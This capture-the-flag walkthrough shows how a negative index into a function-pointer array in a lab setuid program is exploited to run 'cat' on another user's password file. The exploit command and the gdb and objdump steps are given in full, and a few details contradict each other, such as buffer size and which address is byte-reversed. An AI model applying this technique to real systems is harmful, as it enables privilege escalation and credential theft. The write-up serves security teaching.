## Level 3: validate user input and array boundaries

As usual,
the password for the next level is in `/home/level03/.password`,
and a vulnerable setuid program with its source code is in `/levels/level03`.

Let's start by playing with the program to get an idea what it does:
```
level02@box:~$ /levels/level03/level03
Usage: ./level03 INDEX STRING
Possible indices:
[0] to_upper    [1] to_lower
[2] capitalize  [3] length
level02@box:~$ /levels/level03/level03 0 hello
Uppercased string: HELLO
level02@box:~$ /levels/level03/level03 2 hello
Capitalized string: Hello
level02@box:~$ /levels/level03/level03 3 hello
Length of string 'hello': 5
```

The program takes a string and runs some function on it depending on the index parameter.
How can we misuse this?

- Use a very long string
- Use an index higher than 3
- Use a negative index

You can try these or others yourself.
We get the most interesting result with a negative index:
```
level02@box:~$ /levels/level03/level03 -1 x
Segmentation fault
```

Ouch. That can't be good.
Let's look at the relevant source code to see what happens to a negative index:
```
int main(int argc, char **argv) {
  int index;
  fn_ptr fns[NUM_FNS] = {&to_upper, &to_lower, &capitalize, &length};

  // Parse supplied index
  index = atoi(argv[1]);

  return truncate_and_call(fns, index, argv[2]);
}
```

The `main` method converts the index to an integer,
and calls the `truncate_and_call` function with 
an array of functions, the index, and the string argument.
Let's see this other function:
```
int truncate_and_call(fn_ptr *fns, int index, char *user_string) {
  char buf[64];
  // Truncate supplied string
  strncpy(buf, user_string, sizeof(buf) - 1);
  buf[sizeof(buf) - 1] = '\0';
  return fns[index](buf);
}
```

The function truncates the string to have at most 64 characters.
That's a good idea,
so even if we specified a very long string,
only the first 63 characters would be used.
Next, it takes a function pointer from the `fns` array,
and calls it using the truncated buffer as parameter.

But what if the index is negative?
By applying pointer arithmetics,
a negative index will reference a memory location before the beginning of `fns`.
But what is there?
The stack,
and understanding what is on the stack and how it works is the key in this challenge.

The stack is a memory region to store local variables,
function parameters, return values, among others.
The details depend on the CPU architecture,
but roughly the following happens when the `main` function calls `truncate_and_call`:

1. The function parameters are pushed on the stack in reverse order:
   the string, the index, the array of functions
2. The pointer to the next line of code in `main` is pushed on the stack
3. The function `truncate_and_call` is called
4. The local variable `buf` is pushed on the stack

When we reach the line of `fns[index](buf)`,
the content of the stack looks something like this:
```
0x0000      content of buf (1024 bytes)
0x0040+?    the return address
...
0x0040+X    content of fns (16 bytes) -->
0x0040+X        address of to_upper (4 bytes)
0x0040+X+4      address of to_lower
0x0040+X+8      address of capitalize
0x0040+X+12     address of length
0x00??      content of index
0x00??      content of user_string
```

If index is 0, 1, 2, or 3,
the program will find the address of `to_upper`, `to_lower`, `capitalize`, and `length`, respectively,
and execute it.
Using a negative index,
the program will take whatever it finds there,
and try to execute it just like the others.

Now,
if the content of `buf` is stored before `fns`,
then we can put there the address of a function,
and use an appropriate negative index to make the program execute it.
But what function do we want to execute?
This unused function looks perfect:
```
int run(const char *str) {
  // This function is now deprecated.
  return system(str);
}
```

It takes a string and calls `system`,
which in turn will run it like a shell command.
Since we can control the value of the parameter,
we can make the program run whatever we want.

Of course we need to know the address of the `run` function.
We can find that using `objdump`:
```
level02@box:/levels/level03$ objdump -d level03 | grep run
0804879b <run>:
080487ae <truncate_and_call>:
 8048806:   74 05                   je     804880d <truncate_and_call+0x5f>
 80488f1:   e8 b8 fe ff ff          call   80487ae <truncate_and_call>
```
The memory address of the `run` function is `0x0804879b`.

We still need to find the right negative index to use.
For that,
we need to figure out the gap in memory between `fns` and `buf`.
We can do that using `gdb`:
```
level02@box:/levels/level03$ gdb ./level03
(gdb) run -1 AAAAAAAA
Starting program: /levels/level03/level03 -1 AAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0xb77e1334 in ?? () from /lib/libc.so.6
(gdb) x/60xw $sp      
0xbfae3d3c: 0x080487fc  0xbfae3d6c  0xbfae4e4b  0x0000003f
0xbfae3d4c: 0xffffffff  0xbfae4e49  0xffffffff  0xbfae4e4b
0xbfae3d5c: 0xbfae3dd8  0x00000001  0x00000000  0x00000000
0xbfae3d6c: 0x41414141  0x41414141  0x00000000  0x00000000
0xbfae3d7c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3d8c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3d9c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3dac: 0xaf5a90a9  0x00000000  0x0000000a  0xbfae3df8
0xbfae3dbc: 0x080488f6  0xbfae3dd8  0xffffffff  0xbfae4e4b
0xbfae3dcc: 0x08048921  0xb7705f52  0xb77e1334  0x08048624
0xbfae3ddc: 0x08048680  0x080486dc  0x08048759  0x0000044e
```

Explanation:

1. `gdb ./level03`: start the debugger and load the program in memory

2. `run -1 AAAAAAAA`: run the program with the specified parameters.
   We used a negative index to make the program crash.
   We used a string that will be easy to recognize in the memory.

3. `x/60xw $sp`: print the next 60 "words", starting from the beginning of the stack (`$sp` = address of the stack pointer)

The string `AAAAAAAA` is easy to spot:
notice the cluster of `41`s there in the middle,
as that is the ASCII code of the "A" character.

Now we know where `buf` starts.
But we also need to find out where `fns` starts,
so that we can calculate how many bytes we need to point back.
To figure this out,
remember that `fns` contains the addresses of functions,
starting with the address of `to_upper`.
We can find the address of `to_upper` like we did earlier for `run`:
```
level02@box:/levels/level03$ objdump -d level03 | grep to_upper | head -n1
08048624 <to_upper>:
```

Now we can find `0x08048624` in the memory dump we printed earlier,
and calculate the correct negative index until some position in `buf`.
However,
keep in mind that we need to use `buf` for more than one thing:

1. We want to put the address of the `run` method somewhere in it.

2. It should start with a suitable shell command,
   that will be executed by the `run` method,
   and should reveal the content of the password file.

If, for example,
we put the command `cat /home/level03/.password;` in the string,
followed by the address of the `run` method,
the memory will look something like this:
```
0xbfae3d6c:   c a t       / h o m     e / l e     v e l 0
0xbfae3d7c:   3 / . p     a s s w     o r d ;   0x0804879b
0xbfae3d8c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3d9c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3dac: 0xaf5a90a9  0x00000000  0x0000000a  0xbfae3df8
0xbfae3dbc: 0x080488f6  0xbfae3dd8  0xffffffff  0xbfae4e4b
0xbfae3dcc: 0x08048921  0xb7705f52  0xb77e1334  0x08048624
```
In this case the address is 80 bytes away from `fns`.
However,
instead of bytes, we have to count *4-byte* words.
This is because the size of a pointer is 4-bytes,
thus every index in `fns` translates to 4 bytes difference in memory addresses of elements.
As a result, the index we're looking for is `-80/4 = -20`:
```
level02@box:/levels/level03$ ./level03 -20 "cat /home/level03/.password;$(printf '\x9b\x87\x04\x08')"
eingaima
cat: can't open '��': No such file or directory
```

Bingo!
Notice that we had to write the bytes of `0x08048624` in reverse order.
This is because in the OS of the live CD,
integers are represented with the least significant byte first.
Moreover,
the `;` is partly to make the beginning of the string a valid shell command,
and it also serves as a necessary padding,
making the distance between the jump address and `fns` a multiple of 4 bytes.

### Lessons to learn

- When validating user input,
  remember to consider nonsense input too,
  like negative indexes in this example.

- Always check array boundaries.

- Remove unused, deprecated code, especially if it might be dangerous.
